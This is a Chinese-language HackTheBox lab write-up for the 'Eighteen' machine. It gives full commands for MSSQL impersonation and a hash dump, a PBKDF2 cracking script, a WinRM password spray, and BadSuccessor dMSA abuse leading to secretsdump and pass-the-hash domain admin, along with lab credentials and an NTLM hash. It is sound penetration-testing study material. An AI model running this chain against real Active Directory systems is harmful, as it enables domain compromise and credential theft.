# HackTheBox – Eighteen 靶场笔记  

---

## 0x00 侦察

### 0x01 凭证

| 角色  | 用户名 | 密码               | 备注               |
|-------|--------|--------------------|--------------------|
| 初始 | kevin  | iNa2we6haRj2gaw!   | Windows 本地账户   |

---

### 0x02 端口扫描

```bash
nmap -sC -sV -vv -oA nmap 10.129.156.245
```

**关键结果**

| Port | Service | Version / Annotation                             |
| ---- | ------- | ------------------------------------------------ |
| 80   | http    | Microsoft IIS 10.0 → 重定向到 `http://eighteen.htb/` |
| 1433 | mssql   | Microsoft SQL Server 2022 (16.0.1000.0 RC0+)     |

**域名**：`eighteen.htb`

---

## 0x10 初始访问

### 0x11 MSSQL 枚举（本地认证）

```bash
nxc mssql eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' \
     --rid-brute --local-auth
```

**亮点**

- 成功登录 `kevin`
- RID 暴破得到大量域内用户 / 组（节选）

```
1601  mssqlsvc
1603  HR
1604  IT
1605  Finance
1606  jamie.dunn
...
```

---

### 0x12 游客连接 → 发现模拟权限

```bash
impacket-mssqlclient 'eighteen.htb/kevin:iNa2we6haRj2gaw!@10.129.24.98'
```

**SQL 命令**

```sql
-- 查看当前身份
SELECT SYSTEM_USER, USER_NAME();

-- 查数据库
SELECT name FROM master.dbo.sysdatabases;

-- 枚举可 impersonate 的登录
enum_impersonate;          -- 发现可冒充 appdev
```

---

### 0x13 模拟 appdev & 拖库

```sql
EXECUTE AS LOGIN = 'appdev';

USE financial_planner;
SELECT name FROM sys.tables;   -- 发现 users 表
SELECT * FROM users;           -- 拿到 PBKDF2 哈希
```

---

### 0x14 破解 Flask 哈希

**Python 多进程爆破脚本**（PBKDF2-SHA256, 600 000 rounds）

```python
#!/usr/bin/env python3
import hashlib, gzip, multiprocessing as mp

def check(args):
    pwd, salt, it, tgt = args
    try:
        if hashlib.pbkdf2_hmac('sha256', pwd, salt.encode(), it).hex() == tgt:
            return pwd.decode(errors='ignore')
    except: pass
    return None

if __name__ == '__main__':
    salt = '<REDACTED>'
    iterations = 600_000
    target = '<REDACTED_HASH>'

    with gzip.open('rockyou.txt.gz', 'rb') as f:
        passwords = [line.rstrip() for line in f]

    with mp.Pool(mp.cpu_count()) as p:
        for hit in p.imap_unordered(check,
                                    ((p, salt, iterations, target) for p in passwords)):
            if hit:
                print('CRACKED:', hit)
                break
```

**结果**：`iloveyou1`

---

### 0x15 密码喷洒 → WinRM Shell

```bash
cat > users.txt <<EOF
jamie.dunn
jane.smith
alice.jones
adam.scott
bob.brown
carol.white
dave.green
EOF

nxc winrm eighteen.htb -u users.txt -p 'iloveyou1' --no-bruteforce
```

**命中**：`adam.scott / iloveyou1` → `evil-winrm` 拿到普通 shell

---

## 0x20 横向移动

### 0x21 Flask 源码里捡凭证

**文件**：`C:\inetpub\eighteen.htb\app.py`

```python
DB_CONFIG = {
    'server'   : 'dc01.eighteen.htb',
    'database' : 'financial_planner',
    'username' : 'appdev',
    'password' : 'MissThisElite$90',
    ...
}
```

→ 直接拿到 `appdev` SQL 密码，但非 `mssqlsvc`

---

### 0x22 BloodHound 一轮游

```powershell
# 上传 SharpHound.ps1
Import-Module .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All -Domain eighteen.htb \
                  -DomainController dc01.eighteen.htb -zipName bh.zip
```

**结论**：暂无显性 AD 控制路径；需细粒度 ACL 审查。

---

## 0x30 BadSuccessor（dMSA）提权

### 0x31 背景速读

| 缩写 | 含义 |
|------|------|
| MSA  | 单机托管服务账户 |
| gMSA | 组托管服务账户 |
| dMSA | **委派托管服务账户**（Server 2025 新功能） |

**攻击核心**  
若低权用户能在某 OU 创建 / 修改 dMSA 对象，即可将任意高权用户设为“前驱”，KDC 会视 dMSA 为“继承者” → 拿到高权 PAC。

---

### 0x32 指纹 & 前提验证

```powershell
Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion'

ProductName        : Windows Server 2025 Datacenter
CurrentBuildNumber : 26100
```

→ 存在 dMSA 功能。

---

### 0x33 查 ACL → 确认可写 OU

```powershell
Import-Module .\PowerView.ps1
$me = Get-DomainUser -Identity (whoami)

Get-DomainOU | %{
    Get-DomainObjectAcl -Identity $_.DistinguishedName -ResolveGUIDs |
        ?{ $_.IdentityReference -eq $me.SID -and
           $_.ActiveDirectoryRights -match 'CreateChild|GenericAll|GenericWrite' } |
        Select @{n='OU';e={$_.Name}}, IdentityReference, ActiveDirectoryRights
}
```

**结果**

| OU               | 权限摘要 |
|------------------|----------|
| OU=Staff         | CreateChild + GenericAll + WriteDacl + WriteOwner |
| OU=Domain Controllers | CreateChild + GenericAll |

→ 满足利用条件。

---

### 0x34 隧道 + Kerberos 认证

因后续操作 **强制 Kerberos**，用 Ligolo-ng 把 127.0.0.1 隧道出来：

```bash
# 1. 拿 TGT
./ft.sh 240.0.0.1 \
getTGT.py eighteen.htb/'adam.scott:iloveyou1' -dc-ip 240.0.0.1

# 2. 环境变量
export KRB5CCNAME=adam.scott.ccache
export KRB5_CONFIG=krb5.conf
```

> 时间漂移用 `faketime` 修正，略。

---

### 0x35 创建恶意 dMSA

```powershell
.\BadSuccessor.exe escalate `
-targetOU "OU=STAFF,DC=eighteen,DC=htb" `
-dmsa web_svc `
-targetUser "CN=Administrator,CN=Users,DC=eighteen,DC=htb" `
-dnshostname FinancialPlanning `
-user adam.scott `
-dc-ip 127.0.0.1
```

**生成属性**

```
msDS-ManagedAccountPrecededByLink → Administrator
msDS-DelegatedMSAState            → 2 (Ready)
```

→ `web_svc$` 现为 Administrator 的“继任者”。

---

### 0x36 拿到提升 TGS & Dump Hash

```bash
# 1. 申请 web_svc$ 的 TGS（含高权 PAC）
./ft.sh 240.0.0.1 \
getST.py eighteen.htb/adam.scott \
        -impersonate 'web_svc$' -self -dmsa -k -no-pass -dc-ip 240.0.0.1

# 2. 导出 Administrator 哈希
export KRB5CCNAME="web_svc\$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache"

./ft.sh 240.0.0.1 \
secretsdump.py EIGHTEEN.HTB/web_svc\$@dc01.eighteen.htb \
      -k -no-pass -dc-ip 240.0.0.1 -target-ip 240.0.0.1 \
      -just-dc-user Administrator
```

**输出**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b133be956bfaddf9cea56701affddec:::
```

---

### 0x37 PTH 登录 = SYSTEM 级 shell

```bash
evil-winrm -i dc01.eighteen.htb -u administrator \
           -H 0b133be956bfaddf9cea56701affddec
```

---

## 0xFF 总结

1. 端口扫描 → IIS + MSSQL  
2. MSSQL 游客登录 → 发现可 impersonate `appdev`  
3. 拖库 → 破解 Flask PBKDF2 → 拿到 `iloveyou1`  
4. 密码喷洒 → WinRM 拿到 `adam.scott` 会话  
5. PowerView + ACL 枚举 → 确认可在 **STAFF/DC OU** 创建 dMSA  
6. BadSuccessor 创建恶意 dMSA → 继承 Administrator  
7. Kerberos 隧道 → TGS → DCSync → PTH → **域管**

---
